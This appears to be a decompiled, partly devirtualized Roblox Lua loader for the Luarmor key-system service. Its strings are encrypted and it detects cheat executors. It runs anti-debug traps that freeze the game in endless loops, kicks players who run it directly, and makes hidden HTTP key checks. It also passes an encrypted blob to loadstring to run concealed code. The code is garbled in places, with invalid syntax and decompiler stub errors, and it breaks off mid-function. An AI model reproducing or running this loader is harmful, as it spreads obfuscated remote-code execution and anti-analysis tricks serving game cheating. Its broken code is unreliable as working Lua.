-- Luraph runtime function (from the VM object, not part of the script: not lifted).
-- LPH_ENCFUNC decrypts a function this way: (key, encrypted buffer, ...) -> function.
local function luraph_runtime1(...)
	error("Luraph runtime function, not devirtualized")
end

local ... = ...
local v = table.pack(...)

if not ce_like_loadstring_fn then
	if not l_fastload_enabled or not is_from_loader then
		game:GetService("Players").LocalPlayer:Kick("[Luarmor]: Use the loadstring, do not run this directly")
		wait(5)

		while true do
		end
	end
end

local str = "?"
loadstring = ce_like_loadstring_fn or loadstring
local flag = false

pcall(function()
	flag = true
	local UserGameSettings = UserSettings():GetService("UserGameSettings")

	if not UserGameSettings:GetTutorialState("nil  nil  ") then
		str = ""
		local n = ({ wait() })[1] * 1000000

		local function fn(arg)
			local n2 = 1103515245
			local n3 = 12345
			local n4 = 99999999
			local n5 = arg % 2147483648
			local n6 = 1

			return function(arg2, arg3)
				local v2 = n4
				local n7 = n2 * n5 + n3
				local n8 = n7 % v2 + n6
				n6 += 1
				n5 = n8
				n3 = n7 % 4858 * v2 % 5782
				return arg2 + n8 % arg3 - arg2 + 1
			end
		end

		local v2 = fn(n - n % 1)
		UserGameSettings:SetTutorialState("nil  nil  ", true)
		local n2 = 0

		for i = 1, 16 do
			local n3 = 0
			local n4 = 1

			for i2 = 1, 5 do
				local flag2 = v2(10, 20) > 15
				UserGameSettings:SetTutorialState("nil  nil  " .. n2, flag2)
				n3 += (flag2 and 1 or 0) * n4
				n4 *= 2
				n2 += 1
			end

			str ..= ("qwertyuiopasdfghjklzxcvbnm098765"):sub(n3 + 1, n3 + 1)
		end
	else
		str = ""
		local n = 0

		for i = 1, 16 do
			local n2 = 0
			local n3 = 1

			for i2 = 1, 5 do
				n2 += (UserGameSettings:GetTutorialState("nil  nil  " .. n) and 1 or 0) * n3
				n3 *= 2
				n += 1
			end

			str ..= ("qwertyuiopasdfghjklzxcvbnm098765"):sub(n2 + 1, n2 + 1)
		end
	end
end)

while not flag do
end

local now = os.clock()

if devsignature_sig then
	print([[        Luarmor - Lua whitelist service
        This is a signature - If you are seeing this, you know what not to do :3
        Have a good day!
        https://luarmor.net/
    ]])
end

local v2 = ({ table.unpack(v, 1, v.n) })[3]

if v2 and v2[1] then
end

local floor = math.floor
local random = math.random
local remove = table.remove
local char = string.char
local n = 0
local n2 = 2
local tbl = {}
local tbl2 = {}

for i = 1, 256 do
	tbl2[i] = i
end

repeat
	local v3 = random(1, #tbl2)
	local v4 = remove(tbl2, v3)
	tbl[v4] = char(v4 - 1)
until #tbl2 == 0

local tbl3 = {}

local function fn()
	if #tbl3 == 0 then
		n = (n * 149 + 744125792949) % 35184372088832

		repeat
			n2 = n2 * 43 % 257
		until n2 ~= 1

		local n3 = n2 % 32
		local n4 = floor(n / 2 ^ (13 - (n2 - n3) / 32)) % 4294967296 / 2 ^ n3
		local n5 = floor(n4 % 1 * 4294967296) + floor(n4)
		local n6 = n5 % 65536
		local n7 = (n5 - n6) / 65536
		local n8 = n6 % 256
		local n9 = n7 % 256
		tbl3 = { n8, (n6 - n8) / 256, n9, (n7 - n9) / 256 }
	end

	return table.remove(tbl3)
end

local tbl4 = {}
local v3 = tbl4

local function fn2(arg, arg2)
	local v4 = tbl4

	if not v4[arg2] then
		tbl3 = {}
		local v5 = tbl
		n = arg2 % 35184372088832
		n2 = arg2 % 255 + 2
		v4[arg2] = ""
		local n3 = 233

		for i = 1, #arg do
			n3 = (string.byte(arg, i) + fn() + n3) % 256
			v4[arg2] = v4[arg2] .. v5[n3 + 1]
		end
	end

	return arg2
end

local v4 = LUARMOR_SkipAntidebugDevMode
local v5 = LUARMOR_AllowKeyCheckSkip
local flag2 = ff97f23b97f93792992999 and ff97f23b97f93792992999() == v3[fn2("\28", 25249809554395)] or false
local v6 = v3[fn2("i\188\179R\145$\138\138\230\234=7Zwv\251\245\247\17\149D\\hg.st", 5102576865936)]
local v7 = USE_NON_SSL_NODE
local v8 = l_fastload_enabled
local n3 = os[v3[fn2("c\17\192\134", 34962100748080)]](os[v3[fn2("\246\230\tf", 19868051294279)]](v3[fn2("\25N", 16652096388244)])) - os[v3[fn2("S\177\150\214", 16392242936738)]](os[v3[fn2("k\249\251\239", 2889527429763)]](v3[fn2("\2111\128", 24725807553011)]))
local n4

if n3 < 0 then
	n4 = (86400 + -(-n3 % 86400)) % 86400
else
	n4 = n3 % 86400
end

local n5 = n4 / 3600

if n5 >= 21 or n5 < 5 then
	local tbl5 = {}
	local v9 = v3[fn2("\\\182|Gn\254G\2351\136\177{\1475\246\140\129\189\185\157ܐl\238Ƅ\20", 6285876467422)]
	local v10 = v3[fn2("\140\173\221:B\244r\133\163\15E\183!\228\16\25\148}|\0249\4\214\219\198\247'", 23623041046)]
	tbl5[1] = v9
	tbl5[2] = v10
	v6 = tbl5[math[v3[fn2("\146\14\"\6\142P", 17439173164913)]](1, 2)]
elseif n5 >= 5 and n5 < 15 then
	local tbl5 = {}
	local v9 = v3[fn2("\185$_ \253\31b\155\5E\168\223\241&\222\201\253\216\209\7%ی\29\243\175\16", 17467091304331)]
	local v10 = v3[fn2("m^\168\145J\220\253\208o2kr\23G\159q\184\8ˍ\3)\18\1475\211)", 15168139900718)]
	local v11 = v3[fn2("\143?\205S\254\165f\14\175\0\147)d\229\253\253G\211\194\237$\26\213\nw\221G", 4706354041119)]
	local v12 = v3[fn2("?&\166\0\4\151qG\192O\234\0\179u\254ر\255\135/\r_g\15\135\243\237", 1839375877809)]
	local v13 = v3[fn2("ͪm'd\r\3\15LR'պ\237\230\181\"\6\241\177\181\197r v\23\231", 2741346535929)]
	local v14 = v3[fn2("\131\136\217\225\241QJ\212\0283\182\251顬U(\130\254e%\19\194~\241\2\17", 20227765782934)]
	local v15 = v3[fn2("\172\23\30~i#\133V}UZڛ\218Ɩ\255j\30\213\0208\200i\221\251V", 3867736083986)]
	local v16 = v3[fn2("\151mʬ\241\211K\183\27z5[\255F3\195V\131\196\12\21\157\151ZS\162S", 24075100149653)]
	local v17 = v3[fn2("\178\231/\228\14G\132\175b\219\228#\218A\16\29\128@:\179\222\252H\5\197\15\254", 5319479333722)]
	local v18 = v3[fn2("t,\189\1337\159\236۪-G\181\163!\205mT\247+\179\245u\2114[V\195", 17471386402703)]
	local v19 = v3[fn2("\247\170\254#\184\140\219B\20\210%ٽ\153C\184\159\0190\128\144l\211\246\141\3\22", 27240587649817)]
	tbl5[1] = v9
	tbl5[2] = v10
	tbl5[3] = v11
	tbl5[4] = v12
	tbl5[5] = v13
	tbl5[6] = v14
	tbl5[7] = v15
	tbl5[8] = v16
	tbl5[9] = v17
	tbl5[10] = v18
	tbl5[11] = v19
	v6 = tbl5[math[v3[fn2("\163X@\235\251\134", 29665170680811)]](1, 11)]
elseif n5 >= 15 and n5 < 21 then
	local tbl5 = {}
	local v9 = v3[fn2("D\\-\235\231\1379\146\8\173\159\209^\25'\27\251\1866!\28v\205(\171\178d", 31701047309139)]
	local v10 = v3[fn2("\29\"\224=Q\130i\205Ɏ\136\141\182\3\162\181\217\219i\"`\244\179\151\212\245N", 18405570298613)]
	local v11 = v3[fn2("6\28G\139fN4\171\216\227\7\232\255\30\245\181\6B}3X\206M1 b\217", 47246082092)]
	tbl5[1] = v9
	tbl5[2] = v10
	tbl5[3] = v11
	v6 = tbl5[math[v3[fn2(",\137OC\20\12", 29448268213025)]](1, 2)]
else
	game:GetService(v3[fn2("\153p\142\19232\142", 3753915977128)])[v3[fn2("9I\159\145\136\245\181&\177\7f", 24828889913939)]]:Kick(v3[fn2("\29\177WB\247%\210`\158d\157p\130\199\0\238⌭\252\130\247d\131\182\183\17\142τ\177\246F\246kln\180\147\147\251\195)\11wV\135sq\189\2450\0Q\210\218E}\237y\2\19\157[", 34151400930365)])
end

pcall(function()
	if game:GetService(v3[fn2("\236\245\tg\135\232\191\220\235~Z\n\232o\190/\233\151\12", 22175592894636)]):GetCountryRegionForPlayerAsync(game:GetService(v3[fn2("_\212\229t4\166%", 30523116580618)])[v3[fn2("\185\226\159އ\135\207;\186\rS", 9450290192993)]]) == v3[fn2("\150\249", 33178561149107)] then
		local tbl5 = {}
		local v9 = v3[fn2("\166\139\23\184\166\243\158v\158\251\147\25\172\131\228\221%\213J.\158M*\194}\209\249", 4854534934953)]
		local v10 = v3[fn2("\1865\224<\249\134\205\202\198xkgd=S\160\243q,\253\17\248\208\217\253\133\136", 29740334902321)]
		local v11 = v3[fn2("\138\203▛ȢpҺ\208\22}\171ƹoH\184\235\167=^\22l\132\155", 17810699174091)]
		local v12 = v3[fn2("\201u`\187\to\153Õ\163\185\243}\162\12ԇBIt\20\\\163#\197\0\149", 24492798466330)]
		local v13 = v3[fn2("\26\154\4;\16\8V\31\186\1ݯc\28Δ9͝\158\22\6#\141\153\252\213", 19178688005573)]
		tbl5[1] = v9
		tbl5[2] = v10
		tbl5[3] = v11
		tbl5[4] = v12
		tbl5[5] = v13
		v6 = tbl5[math[v3[fn2("\154,6\21\155e", 15164918576939)]](1, 5)]
	end
end)

local tbl5 = { [v3[fn2("l\227\11\179\225n\252", 31942646592564)]] = v3[fn2("\137\145&", 9647864718105)] }
tbl5[v3[fn2("\243\225,t", 24012821223259)]] = flag2 and LT_R_RRT_H or v3[fn2("\182,\28\11ly*S", 26101312806644)] .. v6
tbl5[v3[fn2("Ì\192\239\173d(z", 27895590151547)]] = "479e9f38148118df2d14fc0795ece576"
tbl5[v3[fn2("\232\208\203w\147\240\162\231-\23<\135\27", 7323142724260)]] = "0474"
tbl5[v3[fn2("\246\214\214~", 34872977456861)]] = "KeySystem"

if v7 then
	tbl5[v3[fn2("\230\11\18\201", 30037770464582)]] = v3[fn2("\15\179\200J\18R\251\249w\150mt\174\29\22\142 \245\202_\26؋\198lR\185", 8312089124413)]
	v6 = v3[fn2("-ם\250\\H\172\7\n\1989Fޡ\192\193\170}\186\155", 30359902842482)]
end

local flag3 = type(({ table.unpack(v, 1, v.n) })[1]) ~= v3[fn2("\2202\170-\230", 3699153472885)]
local fn3 = nil
local n6 = nil
local tbl6 = nil
local tbl7 = nil
local flag4 = nil
local v9 = nil
local tbl8 = nil
local v10 = print
local v11 = next
local v12 = string[v3[fn2("FM\144\149", 6238630385330)]]
local v13 = identifyexecutor
local v14 = game
local v15 = pcall
local v16 = string[v3[fn2("|\224s\254\149\221", 19958248360091)]]
local v17 = debug[v3[fn2("gh\167\183XX'\183n", 2390222244018)]]
local v18 = tonumber
local v19 = setmetatable
local v20 = rawget
local v21 = wait
local v22 = debug[v3[fn2("\228\239\219\238\248\152\159", 20594996693740)]]
local v23 = loadstring
local v24 = os[v3[fn2("P\251\141\5", 13452248101104)]]
local v25 = string[v3[fn2("\194\242\141\159", 7762316532797)]]
local v26 = string[v3[fn2("\221\27\146", 24183551383546)]]
local v27 = spawn
local v28 = game:GetService(v3[fn2("\19\tN\216~A9Z\167\142", 29354849823434)])[v3[fn2("\172\18\163{Aс\1980", 27338301137780)]]
local v29 = os[v3[fn2("\226x\210\210Z", 7857882471574)]]
local v30 = math[v3[fn2("(-G\14", 10033349796992)]]
local v31 = tostring
local v32 = pairs
local v33 = string[v3[fn2("\254\159F-", 25494630161599)]]
local v34 = getgenv
local flag5 = false

local function fn4(arg, arg2)
	v23(v3[fn2("\204h\133\201/\160ܐ?z\25\218?\237I27\133P\240\253ڱGR4\160\203d\240$\3\219Ǟ\154\220#\n\149\15\1755g+]3g\30\221џ\150\2137\208\26\21\252Q`Seq\26\t\12\r\250\12\141\130C\171\157\217ސ\8B\210\193\136\15\253\153\236.\253Ə\193\182˔\4&\193\162ڢ|11\23lef@\214QJ5\207 \0193\181\246\171N\226(ӭ\255\12\155vt\135\229Ӏ\177qU\206\251\245-<K\210\233D@\131\161u\134\243ݍG\137A-X\217\229\6\252\227\241\239!\148%\188\160\3\178m\u{F54A}\19\209m&\134\24\184\155\244w@:y\180@\190\171f\7B\31]t.\242\231\254\215n\166㫸\225/\29\181B?܅6Lw\223\25Q\254^5\174\27N\250j\227\178\11\241\12\156&\250\236Am\135\179\156+\220\217&^\225\244\140,A\2514\212\7#\237\1\216\236H?~<AF\242\3_\162\0\206}\129.T\208\1\171@\245ޮ]\r\145\149\2蝺m\127u\169\2419\214U\233 \229\225;\187\28G\156\157\229\251v}\12\19\231\7\170\249\127\1828\26\142\201#\220\221\250\225\30\222Q`\144v\223\t\188_X\138\5\143", 19311836055105)])(arg, arg2)

	while v21() do
	end
end

local v35 = script_key or v3[fn2("Pݕ\173", 27215890834178)]
local n7 = 0
local flag6 = false

v27(function()
	flag6 = true

	while not flag4 do
		n7 += 1
		v28:Wait()
	end
end)

while not flag6 do
	v28:Wait()
end

local function fn5()
	local v36 = n7

	while n7 == v36 do
		v28:Wait()
	end
end

local function fn6(arg)
	if arg then
		error("devirt: for loop without back edge")
	end

	while v21() do
	end
end

local function fn7(arg)
	for i = 1, 2 do
		local n8 = arg % 9915 + 4
		local n9 = nil
		local n10 = nil

		for i2 = 1, 3 do
			n9 = arg % 4155 + 3

			if i2 % 2 == 1 then
				n9 += 522
			end

			n10 = arg % 9996 + 1

			if n10 % 2 ~= 1 then
				n10 *= 3
			end
		end

		local n11 = arg % 9999995 + 1 + 7765
		local n12 = arg % 1000
		local n13 = fn3((arg - n12) / 1000) % 1000
		local n14 = arg % (n8 * n9 + 9999) + 7765
		arg = (n12 * n13 + n11 + arg % (419824125 - n11 + n12) + (n14 + n12 * n9 + n13) % 999999 * (n11 + n14 % n10)) % 99999999999
	end

	return arg
end

local n8 = 1
local v36 = syn and syn[v3[fn2("\186\\mٕ\138K", 16095881149070)]] or request or http_request

if v13 and ({ v13() })[1] == v3[fn2("v\228\23\235/\218V", 20664792042285)] then
	n8 = 9
elseif v13 and ({ v13() })[1] == v3[fn2("\205a\217  @o\162\30C", 27341522461559)] then
	if ({ v13() })[2] == v3[fn2("\158Q\31", 20984776870999)] then
		n8 = 5
	else
		n8 = 2
	end
elseif FLUXUS_LOADED or EVON_LOADED or WRD_LOADED or COMET_LOADED or OZONE_LOADED or TRIGON_LOADED then
	n8 = 4
elseif KRNL_LOADED then
	n8 = 3
elseif Electron_Loaded then
	n8 = 6
elseif v13 and ({ v13() })[1] == v3[fn2("\191\127\180+\163\159\14", 3281455156208)] then
	n8 = 7
elseif v13 and ({ v13() })[1] == v3[fn2("\28\182aBS\4", 30834511212588)] then
	n8 = 11
elseif v13 and ({ v13() })[1] == v3[fn2("\157\20.\20\250\144!P\196", 27855860491606)] then
	n8 = 11
elseif v13 and ({ v13() })[1] == v3[fn2("\1660", 17434878066541)] then
	n8 = 11
elseif v13 and ({ v13() })[1] == v3[fn2("\166\22\165\6", 28269263709911)] then
	n8 = 11
elseif v13 and ({ v13() })[1] == v3[fn2("\221Z\4}=", 28654748788798)] then
	n8 = 11
elseif v13 and ({ v13() })[1] == v3[fn2("\243\16\193\253\23", 31622661763850)] then
	n8 = 15
end

if v13() == v3[fn2("\191ק\127", 1049077777361)] then
	n8 = 11
end

local function fn8(arg, arg2)
	tbl7 = {}
	tbl6 = {}

	for i = 0, arg do
		local v37 = v12(i)
		tbl6[i] = v37
		tbl6[v37] = i
	end

	for i = 1, #arg2 do
		local v37 = arg2[i]
		tbl7[i - 1] = v37
		tbl7[v37] = i - 1
	end
end

local tbl9 = {}
local v37 = v3[fn2("\247", 27328637166443)]
local v38 = v3[fn2("y", 25973533630077)]
local v39 = v3[fn2("2", 30949405094039)]
local v40 = v3[fn2("p", 34504672771462)]
local v41 = v3[fn2("\245", 27891295053175)]
local v42 = v3[fn2("\r", 15420476930073)]
local v43 = v3[fn2("j", 16699342470336)]
local v44 = v3[fn2("\236", 10262063785301)]
local v45 = v3[fn2("P", 942774092654)]
local v46 = v3[fn2("\158", 30592911929163)]
local v47 = v3[fn2("\189", 30830216114216)]
local v48 = v3[fn2("v", 25122030377828)]
local v49 = v3[fn2("\227", 26024001035948)]
local v50 = v3[fn2("\160", 7296298359435)]
local v51 = v3[fn2("\29", 6518885554103)]
local v52 = v3[fn2("\239", 19802551044106)]
tbl9[1] = v37
tbl9[2] = v38
tbl9[3] = v39
tbl9[4] = v40
tbl9[5] = v41
tbl9[6] = v42
tbl9[7] = v43
tbl9[8] = v44
tbl9[9] = v45
tbl9[10] = v46
tbl9[11] = v47
tbl9[12] = v48
tbl9[13] = v49
tbl9[14] = v50
tbl9[15] = v51
tbl9[16] = v52
fn8(255, tbl9)

fn3 = function(arg)
	return arg - arg % 1
end

local function fn9(arg)
	local n9 = 1103515245
	local n10 = 12345
	local n11 = 99999999
	local n12 = arg % 2147483648
	local n13 = 1

	return function(arg2, arg3)
		local v53 = n11
		local n14 = n9 * n12 + n10
		local n15 = n14 % v53 + n13
		n13 += 1
		n12 = n15
		n10 = n14 % 4859 * v53 % 5781
		return arg2 + n15 % arg3 - arg2 + 1
	end
end

local function fn10(arg)
	for i = 1, 2 do
		local n9 = arg % 9915 + 4
		local n10 = nil
		local n11 = nil

		for i2 = 1, 3 do
			n10 = arg % 4155 + 3

			if i2 % 2 == 1 then
				n10 += 522
			end

			n11 = arg % 9996 + 1

			if n11 % 2 ~= 1 then
				n11 *= 3
			end
		end

		local n12 = arg % 9999995 + 1 + 7765
		local n13 = arg % 1000
		local n14 = fn3((arg - n13) / 1000) % 1000
		local n15 = arg % (n9 * n10 + 9999) + 7765
		arg = (n13 * n14 + n12 + arg % (419824125 - n12 + n13) + (n15 + n13 * n10 + n14) % 999999 * (n12 + n15 % n11)) % 99999999999
	end

	return arg
end

local function fn11()
end

local function fn12(arg)
	local tbl10 = {}
	local tbl11 = {}
	local tbl12 = {}

	for i = 1, 13 do
		local tbl13 = {}
		local tbl14 = {}
		tbl10[tbl13] = tbl14
		tbl11[tbl14] = i
		tbl12[tbl13] = tbl14
	end

	if arg then
		tbl10 = arg[1]
		tbl11 = arg[2]
		tbl12 = arg[3]
	end

	local n9 = 0
	local n10 = 0
	local n11 = 0

	for k, v53 in v11, tbl10, nil do
		local v54 = tbl11[v53]

		if tbl12[k] == v53 then
			n9 += 1
		end

		n10 += 1
		n11 = n10 % 2 == 0 and n11 * v54 or n11 + v54 + n10
	end

	if n9 ~= 13 then
		n6 = -1
	end

	tbl8 = { tbl10, tbl11, tbl12 }
	n6 = n11
	return false
end

local function fn13(arg)
	for i = 1, 2 do
		local n9 = arg % 9915 + 4
		local n10 = nil
		local n11 = nil

		for i2 = 1, 3 do
			n10 = arg % 4155 + 3

			if i2 % 2 == 1 then
				n10 += 522
			end

			n11 = arg % 9996 + 1

			if n11 % 2 ~= 1 then
				n11 *= 3
			end
		end

		local n12 = arg % 9999995 + 1 + 7765
		local n13 = arg % 1000
		local n14 = fn3((arg - n13) / 1000) % 1000
		local n15 = arg % (n9 * n10 + 9999) + 7765
		arg = (n13 * n14 + n12 + arg % (419824125 - n12 + n13) + (n15 + n13 * n10 + n14) % 999999 * (n12 + n15 % n11)) % 99999999999
	end

	return arg
end

local function fn14(arg)
	for i = 1, 2 do
		local n9 = arg % 9915 + 4
		local n10 = nil
		local n11 = nil

		for i2 = 1, 3 do
			n10 = arg % 4155 + 3

			if i2 % 2 == 1 then
				n10 += 522
			end

			n11 = arg % 9996 + 1

			if n11 % 2 ~= 1 then
				n11 *= 3
			end
		end

		local n12 = arg % 9999995 + 1 + 7765
		local n13 = arg % 1000
		local n14 = fn3((arg - n13) / 1000) % 1000
		local n15 = arg % (n9 * n10 + 9999) + 7765
		arg = (n13 * n14 + n12 + arg % (419824125 - n12 + n13) + (n15 + n13 * n10 + n14) % 999999 * (n12 + n15 % n11)) % 99999999999
	end

	return arg
end

local function fn15(arg)
	local n9 = 1103515245
	local n10 = 12345
	local n11 = 99999999
	local n12 = arg % 2147483648
	local n13 = 1

	return function(arg2, arg3)
		local v53 = n11
		local n14 = n9 * n12 + n10
		local n15 = n14 % v53 + n13
		n13 += 1
		n12 = n15
		n10 = n14 % 4859 * v53 % 5781
		return arg2 + n15 % arg3 - arg2 + 1
	end
end

local n9 = 68
fn11(67, v3[fn2("L", 13426477510872)], v3[fn2("\152\18\1646\165\234\196u\130 \1736(8@\157\r\161h\2496^}\184H\1650[", 27850491618641)])
n6 = -1
fn12()

while n6 == -1 do
end

local v53 = fn15(n7 + n6)

if n8 == 9 or n8 == 15 then
	local n10 = 0

	v15(function()
		local function fn16(arg)
			v31(arg[1])
		end

		fn16(v19({}, { [v3[fn2("ŉ\168\23\244\181\15", 3991220162181)]] = function()
			local fn17 = nil

			fn17 = function()
				n10 += 1
				return fn17()
			end

			fn17()
		end }))
	end)

	local n11 = 0

	v15(function()
		v36(v19({}, { [v3[fn2("Sp\195=\29\220g", 3642243419456)]] = function()
			local fn16 = nil

			fn16 = function()
				n11 += 1
				return fn16()
			end

			fn16()
		end }))
	end)

	if n11 + n10 < 20000 then
		n9 = 19
	elseif n11 - n10 ~= 0 then
		n9 = 189
	end
end

local function fn16(arg, arg2, arg3)
	local v54 = v3
	local tbl10 = { [v3[fn2(".\n\163ռ\161", 32844617250684)]] = v54[fn2("\212n\202", 19019769365809)] }

	if arg2 then
		tbl10 = v19(tbl10, { [v3[fn2("\252JM\152 \168\163", 15324910991296)]] = function(arg4, arg5)
			if arg5 == v3[fn2("\19&N", 2813289433660)] then
				local v55 = v3
				local v56 = v16(v17(), v55[fn2("\179\216]\142\12\173lJ}\1.", 7904054779073)])
				local v57 = v56()
				local v58 = v56()
				local n10 = 1

				v15(function()
					n10 = v18(v58) - v18(v57)
				end)

				if (n8 == 9 or n8 == 15) and (n10 ~= 0 or v57 ~= v58) then
					n9 = 121

					while arg3 do
					end
				end

				return arg
			end

			return v20(tbl10, arg5)
		end })
	else
		tbl10[v3[fn2("\187\154\151", 30226754792950)]] = arg
	end

	local v55 = v36(tbl10)

	if v55[v3[fn2("\202*\172\152\3\239\212\19\167Z", 12094997015552)]] == 0 then
		if flag5 then
			warn(v3[fn2("\151/X\27\177\221m\242\241\196\198w\189J8\241\16\22</\20\135!q\167^\23h\231\151ĽfT\146\254;D1\243\161\255l\190\250\19\0217\140\14T\0202v/6\132)p\147\173m\205ỡ \161YE\136\4.ۂ\166k\2141\227~I\251fw\250\194E\231?", 15689994352916)])
		end

		local v56 = v3
		writefile(v3[fn2("\26\2278~lh|\u{EACE}\30\198\\\135\193a\215\212\248\177V", 28497977698220)], v56[fn2("b\191\135\226\194fU\223\222\248,\149\4\rT\171x\1\19\246v\161T\222\202\26g>\171g\7\236\1362@\162;\\\166\251\19\195?\16\172@\29\19\215ƈ\21\249\0p\175\129\240\179\163\240\143wGC/I\1!\14\215\25Z\135\237X \3\153(66W\152\244>\215@ٱ", 6626263013403)])
	end

	return v55[v3[fn2("'\211\220\233", 24497093564702)]], v55[v3[fn2("I\247\208\240\20\157g", 20429635406418)]]
end

fn5()

local function fn17(arg)
	if v34()[8753563] == 22044 and n8 ~= 11 then
		if flag5 then
			warn(v3[fn2("\30\246oＫ(\159G\239\1808S1o\244\163c\201G\14V\6\188\218<\226,\29;\139\236\194oW\218\207Qj\247?\31\245WqpR\213\228l\6|\t\247R\28\169\\\138\210O\2275\255T[\150b4\14\223\213*\209\30\rhƽ\255\250\235\170y\155\219\14\253\173m\143\231kc%\242\129ql\23\178\196\t\167\230\182\25\128u\31^[_\2402\213B2y\28\153\131\189B\1\8\160\191R\25*\185s\168\240\253i\254\176\137j*5\131\228\168p\142\8\216D\209\u{7B4}_*\24K\202u\202\249\176-dc\249ܩ\204\19\133\251\246\214\18\140\17'X\225\227]\194<_\"\156\131 \171\133!\146\143\215\196\\\157͢", 2624305105292)])
		end

		v27(function()
			v21(5)
			v34()[8753563] = nil
		end)

		fn6()
	end

	v34()[8753563] = 22044
	local flag7 = false
	local tbl10 = { v22, v19, v31 }

	tbl10[-1] = n8 == 3 and function()
	end or v36

	local v54 = v26
	local v55 = v25
	local v56 = v24
	local v57 = v23
	local v58 = v15
	tbl10[4] = v12
	tbl10[5] = v54
	tbl10[6] = v55
	tbl10[7] = v56
	tbl10[8] = v57
	tbl10[9] = v58

	local function fn18()
		flag7 = true
		return v3[fn2("\134", 18259536953965)]:rep(16777215)
	end

	local v59 = v19({}, { [v3[fn2("f\138\r\15#0;o\243\235", 3421045853298)]] = function()
		flag7 = true
		return v3[fn2("\210", 31637694608152)]:rep(16777215)
	end })

	for k, v60 in v11, tbl10, nil do
		if k ~= -1 then
			local flag8 = n8 ~= 11

			if flag8 then
				local v61 = v3
				flag8 = v22(v60)[v61[fn2("Z\147\159\228", 20054888073461)]] == v3[fn2("$\155\205", 26973217776160)]
			end

			if flag8 then
				flag7 = true
			end
		end

		if v60 ~= v10 and v60 ~= v31 then
			local v61 = v10
			local v62 = v31
			local v63 = error
			local env = getfenv()
			env[v3[fn2("\221\194(\142[\234\176\127", 25788844400081)]] = fn18
			env[v3[fn2(",d߫\226", 4076048355028)]] = fn18
			env[v3[fn2("\19\248=\240R", 27063414841972)]] = fn18

			if k == -1 then
				if n8 ~= 5 then
					v15(v60, v3[fn2("", 33754104330955)])
				end
			else
				v15(v60, v59)
			end

			env[v3[fn2("\133\208A\235\231\156\250+", 27092406755983)]] = v62
			env[v3[fn2("͙\1313x", 7037518682522)]] = v61
			env[v3[fn2("\190\172\160;\162", 28420665927524)]] = v63
		end
	end

	if flag7 and n8 ~= 11 then
		n9 = 85

		if arg then
			fn6(true)
		end
	end

	v34()[8753563] = nil
end

local v54 = n7
local v55 = nil
local flag7 = nil

while true do
	local v56 = v15(function()
		local v56 = fn16
		local v57 = v3
		v55 = v56(tbl5[v3[fn2("\177\153-\186", 20435004279383)]] .. v57[fn2("\136\29\133\158\152|\183", 27607818560623)], n8 == 9 or n8 == 15)
		local data = v14:GetService(v3[fn2("\18+\218z\19R\150\132\151\204\\", 24806340647486)]):JSONDecode(v55)

		if not data[v3[fn2("\170ktʥs", 20678751111994)]] then
			warn(data[v3[fn2("\222?ۤ\132\195I", 27760294552829)]])
			fn6()
		end

		if not data[v3[fn2("ր\178C\148E:\131", 27969680598464)]][tbl5[v3[fn2("\223hF\178}\182\195", 9183994093929)]]] then
			warn(v3[fn2(";p\232\194O\137O\170J\176\178c8ǿ\230*\141x\2140\127o\219o\1\250gU\226\237\229|m\158s\r\139x\132x\136椯\"\173X\\\232\162)\3\228", 5848850208071)])
			fn6()
		end

		tbl5[v3[fn2("\135\22T\225", 32883273136032)]] = flag2 and LT_R_RRT_H or v7 and v3[fn2("\7\192\16VM\203\7\233\219\217*w'\241\171\207\247\236\0\195\2\154S]\167\147\203", 12416055618859)] or v3[fn2("\165-Kͫ\216)\134", 31736481870708)] .. v6
		local v58 = tbl5
		local v59 = v3
		v9 = data[v3[fn2("ʛ\135Y\192\183d\185", 14786949920203)]][v58[v59[fn2("\202R\200#\227\26\246", 4772928065885)]]]
	end)

	fn5()

	if not v56 then
		if flag7 then
			break
		end
		fn11(69, v3[fn2("\25", 31670981620535)], v3[fn2("\143\229\31#\3\127\186\25R\236\2377\167\158\134\30\242\\\rU_\180\15\30\151\16\151\201", 16353587051390)])
		v6 = v3[fn2("ge1\165\149mj\234\165\193\248\11N\170\186\240\7㙊\1285\207)\218en", 19540550043414)]
		tbl5[v3[fn2("y01\134", 15793076713844)]] = flag2 and LT_R_RRT_H or v3[fn2("Yz\179\216]Z\169'\26\156\175\162\1l\196u\247\205n\249G\138ds\149Q\153\"xe\143!\129\15<", 7585143724952)]
		flag7 = true
	end

	if not v56 then
		continue
	end

	local function fn18(arg)
		local n10 = 1103515245
		local n11 = 12345
		local n12 = 99999999
		local n13 = arg % 2147483648
		local n14 = 1

		return function(arg2, arg3)
			local v57 = n12
			local n15 = n10 * n13 + n11
			local n16 = n15 % v57 + n14
			n14 += 1
			n13 = n16
			n11 = n15 % 4859 * v57 % 5781
			return arg2 + n16 % arg3 - arg2 + 1
		end
	end

	local n10 = n7 % 8585 * v54 % 9910
	fn17()

	if flag3 then
		n9 = 146
	end

	fn11(85, v3[fn2("\24", 21972649496559)], v3[fn2("\187i\181\209XW\149\167\254\\Ѧ\228\148z\20\27\26\150\3\8\145x$\141", 24700036962779)])
	local v57 = fn18(n10 + v53(2, 4096))
	local v58 = v53(1111, 32768)
	local n11 = 12000 + ((1398563873 * ((1398563873 * (1361 + n10 + n6 % 1000 + n6) % 1610612736 + 22491) % 95716599 + 1) + 22491) % 95716599 + 1) % 120000 - 12000 + 1
	local tbl10 = { n11 + v57(100000, 1000000), v58, n11 + v53(3333, 15625) + n7, (v57(10000, 1000000)) }
	n6 = -1
	fn12()
	local flag8 = false

	if n6 == -1 then
		n6 = 100
		flag8 = true
	end

	local n12 = 0
	local n13 = 0
	local n14 = 0
	local n15 = 1
	local tbl11 = { [0] = 0 }

	local function fn19(arg, arg2, arg3)
		arg2 = arg2 and arg or tbl6[arg]

		if not arg3 then
			arg2 = (arg2 + 4096 - tbl11[n12]) % 256
			n14 += arg2
			n12 = (n12 + 1) % n15
		end

		local n16 = arg2 % 16
		return tbl7[(arg2 - n16) / 16] .. tbl7[n16]
	end

	local function fn20(arg)
		local n16 = 0

		for i = 1, #arg do
			n16 += v25(arg, i)
		end

		return n16
	end

	local function fn21(arg, arg2)
		local v59 = tbl7
		local n16 = (tbl7[v26(arg, 1, 1)] * 16 + v59[v26(arg, 2, 2)] + tbl11[n13]) % 256
		n13 = (n13 + 1) % n15
		if arg2 then
			return n16
		end
		return tbl6[n16]
	end

	local function fn22(arg)
		local tbl12 = {}
		n13 = 0
		local n16 = 1

		while true do
			local v59 = fn21(v26(arg, n16, n16 + 1), true)
			n16 += 2
			local v60 = v3[fn2("", 2271033264195)]

			for i = 1, v59 do
				v60 ..= fn21(v26(arg, n16, n16 + 1))
				n16 += 2
			end

			tbl12[#tbl12 + 1] = v60
			if not (n16 > #arg) then
				continue
			end
			break
		end

